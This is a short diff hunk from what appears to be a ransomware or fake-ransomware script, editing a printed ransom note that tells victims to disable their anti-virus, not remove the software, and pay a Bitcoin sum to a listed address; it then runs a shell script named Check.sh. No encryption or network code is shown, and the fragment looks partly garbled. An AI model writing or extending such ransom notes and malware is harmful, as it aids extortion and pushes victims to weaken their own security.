@@ -94,6 +94,6 @@ If you need our assistance, send a message by clicking .
 
 We strongly recommend you to not remove this software, and disable your anti-virus for a while, until you pay and the payment gets processed. If your anti-virus gets updated and removes this software automatically, it will not be able to recover your files even if you pay!\033[0m''')
 slowprints('''\033[31mBitcoin:600.7
-Address:eUeuf7H2ur73jf&eUeuf7[0m''')">Note.py
+Address:eUeuf7H2ur73jf&eUeuf7 \033[0m''')">Note.py
 bash Check.sh
 exit
